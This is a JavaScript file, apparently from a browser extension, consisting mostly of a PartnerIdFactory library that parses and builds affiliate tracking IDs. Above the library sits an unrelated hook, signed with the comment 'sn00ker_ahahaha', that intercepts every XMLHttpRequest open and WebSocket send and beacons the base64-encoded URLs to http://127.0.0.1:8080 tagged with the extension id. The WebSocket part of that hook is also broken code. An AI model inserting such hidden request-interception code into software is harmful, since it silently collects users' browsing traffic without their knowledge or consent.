function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var INVALID_SUB_ID = 'XXXXXXXXXX';
function PartnerIdFactory() {
    var _parse = function (s, subId, defaultCobrand) {
        if (typeof (s) === 'undefined')
            s = null;
        if (typeof (subId) === 'undefined')
            subId = null;
        if (typeof (defaultCobrand) === 'undefined')
            defaultCobrand = null;
        s = trim(s);
        if (isEmpty(s)) {
            if (defaultCobrand === null)
                return new PartnerId(null, null, null, null, null, null, "", null, false);
            return getDefaultPartnerId(defaultCobrand, subId, s, defaultCobrand.length === 2);
        }
        if (s.charAt(0) == DELIMITER)
            return parseNew(s, subId, defaultCobrand);
        return parseOld(s, null, subId, defaultCobrand);
    };
    this.parse = _parse;
    this.makePartnerId = function (cobrand, campaign, track, country, subId, parent, useOldFormat) {
        if (typeof (cobrand) === 'undefined')
            cobrand = null;
        if (typeof (campaign) === 'undefined')
            campaign = null;
        if (typeof (track) === 'undefined')
            track = null;
        if (typeof (country) === 'undefined')
            country = null;
        if (typeof (subId) === 'undefined')
            subId = null;
        if (typeof (parent) === 'undefined')
            parent = null;
        if (typeof (useOldFormat) === 'undefined')
            useOldFormat = false;
        return new PartnerId(cobrand, campaign, track, country, _validateSubId(subId), parent, null, null, useOldFormat);
    };
    var _makeViralPartnerId = function (child, parent, subId) {
        if (typeof (subId) === 'undefined')
            subId = null;
        var childId = _parse(child, subId);
        if (typeof (parent) === 'undefined' || parent === null) {
            return childId;
        }
        var parentId = _parse(parent);
        var useOldFormat = childId.isOldFormat() && (!parentId.hasParent() && parentId.isOldFormat() || parentId.hasParent() && parentId.getParent().isOldFormat());
        return new PartnerId(childId.getCobrand(), childId.getCampaign(), childId.getTrack(), childId.getCountry(), _validateSubId(subId), parentId, null, null, useOldFormat);
    };
    this.makeViralPartnerId = _makeViralPartnerId;
    this.validateField = _validateField;
    this.isFieldValid = _isFieldValid;
    this.validateCountry = _validateCountry;
    this.validateSubId = _validateSubId;
    this.urlEncodePartnerId = _urlEncodePartnerId;
    var DELIMITER = '^';
    var PARENT_DELIMITER = '_';
    var NEW_PARTNER_PARAM = 'p2';
    var MAX_ID_LEN = 23;
    var VALID_FIELD = /^[a-zA-Z0-9]{1,6}$/;
    var VALID_SUB_ID = /^[a-zA-Z0-9_-]{2,100}$/;
    var TRIM_LEFT = /^\s+/;
    var TRIM_RIGHT = /\s+$/;
    function PartnerId(_cobrand, _campaign, _track, _country, _subId, _parent, _serializedForm, _reportingTrack, useOldFormat) {
        var cobrand = toUpperCase(_validateField(_cobrand));
        var campaign = null;
        var track = null;
        var country = null;
        var parent = null;
        var subId = null;
        var reportingTrack = null;
        var serializedForm = "";
        if (cobrand != null) {
            campaign = toLowerCase(_validateField(_campaign));
            track = toUpperCase(_validateField(_track));
            country = _validateCountry(_country);
            if (_parent != null) {
                if (_parent.hasParent())
                    _parent = _parent.getParent();
                if (!_parent.isValid())
                    _parent = null;
                if (_parent != null && _parent.hasSubId()) {
                    _parent = new PartnerId(_parent.getCobrand(), _parent.getCampaign(), _parent.getTrack(), _parent.getCountry(), null, null, _parent.toString(), _parent.getReportingTrack(), _parent.isOldFormat());
                }
            }
            parent = _parent;
            if (!isEmpty(_subId))
                subId = trim(_subId);
            serializedForm = trim(_serializedForm);
            if (serializedForm == null) {
                var pair = [];
                if (useOldFormat)
                    pair = serializeOld(cobrand, campaign, track, country, parent);
                else
                    pair = serializeNew(cobrand, campaign, track, country, parent);
                serializedForm = pair[0];
                reportingTrack = pair[1];
            }
            else
                reportingTrack = trim(toLowerCase(_reportingTrack));
        }
        this.toString = function () {
            return serializedForm;
        };
        this.getCobrand = function () {
            return cobrand;
        };
        this.getCampaign = function () {
            return campaign;
        };
        this.getTrack = function () {
            return track;
        };
        this.getCountry = function () {
            return country;
        };
        this.getSubId = function () {
            return subId;
        };
        this.getReportingTrack = function () {
            return reportingTrack;
        };
        this.getParent = function () {
            return parent;
        };
        this.getChild = function () {
            if (parent == null)
                return this;
            return new PartnerId(cobrand, campaign, track, country, subId, null, null, null, useOldFormat);
        };
        this.hasCobrand = function () {
            return cobrand != null;
        };
        this.hasCampaign = function () {
            return campaign != null;
        };
        this.hasTrack = function () {
            return track != null;
        };
        this.hasCountry = function () {
            return country != null;
        };
        this.hasSubId = function () {
            return subId != null;
        };
        this.hasParent = function () {
            return parent != null;
        };
        this.addToUrl = function (baseUrl, oldParamName, oldParamName2) {
            var s = '';
            if (baseUrl != null)
                s = trim(baseUrl);
            if (_isValid()) {
                var lastChar = '\0';
                if (s.length > 0)
                    lastChar = s.charAt(s.length - 1);
                if (lastChar != '?' && lastChar != '&') {
                    if (s.indexOf('?') >= 0 || s.indexOf('&') >= 0)
                        s += '&';
                    else
                        s += '?';
                }
                s += _appendQueryParameters(oldParamName, oldParamName2);
            }
            return s;
        };
        this.makeViralPartnerId = function (child, childSubId) {
            if (typeof (childSubId) === 'undefined')
                childSubId = null;
            return _makeViralPartnerId(child, serializedForm, childSubId);
        };
        this.isValid = _isValid;
        this.isNewFormat = _isNewFormat;
        this.isOldFormat = _isOldFormat;
        this.appendQueryParameters = _appendQueryParameters;
        function _isValid() {
            return cobrand != null;
        }
        function _isNewFormat() {
            return serializedForm.length > 0 && serializedForm.charAt(0) == DELIMITER;
        }
        function _isOldFormat() {
            return serializedForm.length > 0 && serializedForm.charAt(0) != DELIMITER;
        }
        function _appendQueryParameters(oldParamName, oldParamName2) {
            var s = '';
            if (!_isValid())
                return s;
            var encoded = _urlEncodePartnerId(serializedForm);
            if (_isNewFormat())
                s += 'p2=';
            else {
                if (!isEmpty(oldParamName2))
                    s += oldParamName2 + '=' + encoded + '&';
                s += oldParamName + '=';
            }
            s += encoded;
            if (subId != null) {
                s += '&si=' + urlEncode(subId);
            }
            return s;
        }
    }
    function parseNew(s, subId, defaultCobrand) {
        if (s.charAt(0) != DELIMITER)
            return getDefaultPartnerId(defaultCobrand, subId, s, false);
        var leadingDelimiterStripped = s.substring(1);
        var st = new StringTokenizer(leadingDelimiterStripped);
        var cobrand = st.nextToken(DELIMITER);
        if (!_isFieldValid(cobrand))
            return getDefaultPartnerId(defaultCobrand, subId, s, false);
        if (st.hasMoreTokens() && st.remainder().indexOf('|') > 0)
            return getDefaultPartnerId(cobrand, subId, s, false);
        var childPart = st.nextToken(PARENT_DELIMITER);
        var parent = null;
        if (st.hasMoreTokens()) {
            parent = _parse(normalizeParent(st.remainder()), null, null);
        }
        var stChild = new StringTokenizer(childPart);
        var campaign = stChild.nextToken(DELIMITER);
        var track = stChild.nextToken(DELIMITER);
        var country = stChild.nextToken(DELIMITER);
        var reportingTrack = null;
        var pos = leadingDelimiterStripped.indexOf(DELIMITER);
        if (pos > 0)
            reportingTrack = leadingDelimiterStripped.substring(pos);
        return new PartnerId(cobrand, campaign, track, country, subId, parent, s, reportingTrack, false);
    }
    function normalizeParent(parent) {
        var parentIsOldFormat = parent.indexOf(DELIMITER) < 0 && (parent.length === 2 || parent.length > 6);
        if (!parentIsOldFormat && parent.charAt(0) !== DELIMITER)
            parent = DELIMITER + parent;
        return parent;
    }
    function parseOld(partnerParam, idCookie, subId, defaultCobrand) {
        var serializedPartnerString = null;
        var cobrand = null;
        var reportingTrack = null;
        var campaign = null;
        var track = null;
        var country = null;
        var parent = null;
        if (partnerParam != null) {
            serializedPartnerString = partnerParam;
            partnerParam = partnerParam.toUpperCase();
            if (partnerParam.length > 2) {
                reportingTrack = partnerParam.substring(2);
                cobrand = partnerParam.substring(0, 2);
            }
            else {
                cobrand = partnerParam;
            }
            if (reportingTrack == null && idCookie != null && idCookie.length <= MAX_ID_LEN) {
                reportingTrack = idCookie;
                if (serializedPartnerString.length == 2)
                    serializedPartnerString += idCookie;
            }
            if (!_isFieldValid(cobrand) || cobrand.length != 2) {
                cobrand = defaultCobrand;
            }
        }
        else {
            cobrand = defaultCobrand;
        }
        if (cobrand == null)
            return new PartnerId(null, null, null, null, null, null, "", null);
        if (reportingTrack != null && reportingTrack.indexOf('|') >= 0)
            reportingTrack = null;
        var origTid = reportingTrack;
        if (reportingTrack != null) {
            var pos = serializedPartnerString.indexOf(PARENT_DELIMITER);
            if (pos >= 0) {
                parent = _parse(normalizeParent(serializedPartnerString.substring(pos + 1)), null, null);
                pos = reportingTrack.indexOf(PARENT_DELIMITER);
                if (pos >= 0)
                    reportingTrack = reportingTrack.substring(0, pos);
            }
            var len = reportingTrack.length;
            if (len <= 6)
                campaign = reportingTrack;
            else
                campaign = reportingTrack.substring(0, 6);
            if (len >= 8) {
                track = reportingTrack.substring(6, 8);
                if (len >= 10)
                    country = reportingTrack.substring(8, 10);
            }
        }
        return new PartnerId(cobrand, campaign, track, country, subId, parent, serializedPartnerString, origTid, true);
    }
    function serializeNew(cobrand, campaign, track, country, parent) {
        var s = DELIMITER;
        if (cobrand != null)
            s += cobrand;
        var reportingTrackStart = s.length;
        s += DELIMITER;
        if (campaign != null)
            s += campaign;
        s += DELIMITER;
        if (track != null)
            s += track;
        s += DELIMITER;
        if (country != null)
            s += country;
        if (parent != null) {
            s += PARENT_DELIMITER;
            s += serializeNew(parent.getCobrand(), parent.getCampaign(), parent.getTrack(), parent.getCountry(), null)[0].substring(1);
        }
        var reportingTrack = s.substring(reportingTrackStart).toLowerCase();
        return [s, reportingTrack];
    }
    function serializeOld(cobrand, campaign, track, country, parent) {
        if (cobrand == null)
            return ["", ""];
        if (cobrand.length != 2)
            return ["", ""];
        var s = cobrand;
        var reportingTrackStart = s.length;
        if (length(campaign) == 6) {
            s += campaign;
            if (length(track) == 2) {
                s += track;
                if (length(country) == 2)
                    s += country;
            }
        }
        if (parent != null) {
            var serializedParent = serializeOld(parent.getCobrand(), parent.getCampaign(), parent.getTrack(), parent.getCountry(), null)[0];
            if (serializedParent.length > 0) {
                s += '_' + serializedParent;
            }
        }
        var reportingTrack = s.substring(reportingTrackStart).toLowerCase();
        return [s, reportingTrack];
    }
    function length(s) {
        if (s == null)
            return 0;
        return s.length;
    }
    function _validateField(field) {
        field = trim(field);
        if (isEmpty(field)) {
            return null;
        }
        if (!VALID_FIELD.test(field)) {
            return null;
        }
        return field;
    }
    function _validateCountry(country) {
        country = _validateField(country);
        if (country == null)
            return null;
        if (country.length != 2)
            return null;
        return country.toLowerCase();
    }
    function _validateSubId(subId) {
        subId = trim(subId);
        if (isEmpty(subId)) {
            return null;
        }
        if (!VALID_SUB_ID.test(subId)) {
            return INVALID_SUB_ID;
        }
        return subId;
    }
    function _isFieldValid(field) {
        return _validateField(field) != null;
    }
    function getDefaultPartnerId(cobrand, subId, origValue, useOldFormat) {
        return new PartnerId(cobrand, null, null, null, subId, null, origValue, null, useOldFormat);
    }
    function isEmpty(s) {
        return s == null || s.length == 0;
    }
    function toUpperCase(s) {
        if (s == null)
            return null;
        return s.toUpperCase();
    }
    function toLowerCase(s) {
        if (s == null)
            return null;
        return s.toLowerCase();
    }
    var trim = String.prototype.trim ?
        function (text) {
            return text == null ?
                null :
                String.prototype.trim.call(text);
        } :
        function (text) {
            return text == null ?
                null :
                text.toString().replace(TRIM_LEFT, "").replace(TRIM_RIGHT, "");
        };
    function _urlEncodePartnerId(partnerId) {
        return encodeURIComponent(partnerId).replace(/%5[eE]/g, '^');
    }
    function urlEncode(s) {
        return encodeURIComponent(s);
    }
    function StringTokenizer(text) {
        var s = text;
        var start = 0;
        var len = 0;
        if (text != null)
            len = text.length;
        this.hasMoreTokens = function () {
            return start < len;
        };
        this.nextToken = function (delim) {
            if (!this.hasMoreTokens())
                return null;
            var pos;
            for (pos = start; pos < len; pos++) {
                if (s.charAt(pos) == delim) {
                    var result = s.substring(start, pos);
                    start = pos + 1;
                    return result;
                }
            }
            var result = s.substring(start);
            start = len;
            return result;
        };
        this.remainder = function () {
            if (!this.hasMoreTokens())
                return null;
            return s.substring(start);
        };
    }
}
var GlobalPartnerIdFactory = new PartnerIdFactory();
